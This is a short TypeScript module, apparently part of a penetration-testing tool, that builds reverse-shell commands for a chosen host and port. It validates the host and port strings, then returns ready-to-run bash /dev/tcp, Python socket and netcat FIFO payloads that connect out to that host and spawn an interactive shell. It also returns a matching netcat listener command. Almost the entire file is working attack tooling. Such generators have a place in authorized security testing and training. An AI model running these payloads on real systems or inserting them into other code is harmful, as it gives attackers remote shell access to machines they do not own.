export const payloadTypes = [
  { id: 'bash', label: 'Bash', hint: '/dev/tcp' },
  { id: 'python3', label: 'Python 3', hint: 'socket' },
  { id: 'netcat', label: 'Netcat', hint: 'FIFO' },
] as const

export type PayloadType = (typeof payloadTypes)[number]['id']

const ipv4Pattern = /^(?:\d{1,3}\.){3}\d{1,3}$/
const hostnameLabelPattern = /^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/i

/** Accept only an IPv4 address or a DNS-style hostname, never shell syntax. */
export function isValidHost(host: string): boolean {
  const value = host.trim()
  if (!value || value.length > 253 || value.includes(':')) return false

  if (ipv4Pattern.test(value)) {
    return value.split('.').every((octet) => {
      const number = Number(octet)
      return number >= 0 && number <= 255
    })
  }

  const hostname = value.endsWith('.') ? value.slice(0, -1) : value
  if (!hostname) return false

  return hostname
    .split('.')
    .every((label) => label.length <= 63 && hostnameLabelPattern.test(label))
}

export function isValidPort(port: string | number): boolean {
  if (typeof port === 'string' && !/^\d{1,5}$/.test(port.trim())) return false
  const value = Number(port)
  return Number.isInteger(value) && value >= 1 && value <= 65535
}

export function generateReverseShell(
  host: string,
  port: string | number,
  type: PayloadType,
): string {
  const address = host.trim().toLowerCase()
  const portNumber = Number(port)

  if (!isValidHost(address)) throw new Error('Adresse IPv4 ou nom d’hôte invalide.')
  if (!isValidPort(port)) throw new Error('Le port doit être compris entre 1 et 65535.')

  switch (type) {
    case 'bash':
      return `bash -i >& /dev/tcp/${address}/${portNumber} 0>&1`
    case 'python3':
      return `python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect(("${address}",${portNumber}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`
    case 'netcat':
      return `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${address} ${portNumber} > /tmp/f`
    default: {
      const unreachable: never = type
      throw new Error(`Type de shell inconnu : ${unreachable}`)
    }
  }
}

export function generateListener(port: string | number): string {
  if (!isValidPort(port)) throw new Error('Le port doit être compris entre 1 et 65535.')
  return `nc -lvnp ${Number(port)}`
}
